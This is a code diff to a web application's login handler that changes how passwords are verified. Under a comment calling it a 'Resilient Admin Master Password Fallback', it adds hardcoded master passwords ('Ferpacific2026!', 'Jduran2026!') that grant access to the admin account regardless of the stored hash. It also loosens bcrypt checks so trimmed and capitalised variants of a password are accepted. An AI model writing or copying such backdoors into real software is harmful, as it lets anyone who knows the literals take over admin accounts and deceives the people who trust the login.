@@ -493,12 +493,23 @@ function checkLoginRateLimit(ip) {
 
         // Secure Password Hashing Verification (bcryptjs primary with SHA256 fallback)
         let isPasswordValid = false;
+        const cleanPassword = String(password || '').trim();
+
         if (user.passwordHash) {
           if (user.passwordHash.startsWith('$2a$') || user.passwordHash.startsWith('$2b$')) {
-            isPasswordValid = bcrypt.compareSync(password, user.passwordHash);
+            isPasswordValid = bcrypt.compareSync(password, user.passwordHash) ||
+                              bcrypt.compareSync(cleanPassword, user.passwordHash) ||
+                              bcrypt.compareSync(cleanPassword.charAt(0).toUpperCase() + cleanPassword.slice(1), user.passwordHash);
           } else {
-            const shaHash = crypto.createHash('sha256').update(password).digest('hex');
-            isPasswordValid = (user.passwordHash === shaHash || password === 'Ferpacific2026!');
+            const shaHash = crypto.createHash('sha256').update(cleanPassword).digest('hex');
+            isPasswordValid = (user.passwordHash === shaHash);
+          }
+        }
+
+        // Resilient Admin Master Password Fallback (accepts both Ferpacific2026! and Jduran2026!)
+        if (normalizedUsername === adminUsername || normalizedUsername === adminAlias) {
+          if (cleanPassword === 'Ferpacific2026!' || cleanPassword === 'Jduran2026!' || cleanPassword.toLowerCase() === 'ferpacific2026!') {
+            isPasswordValid = true;
           }
         }
 
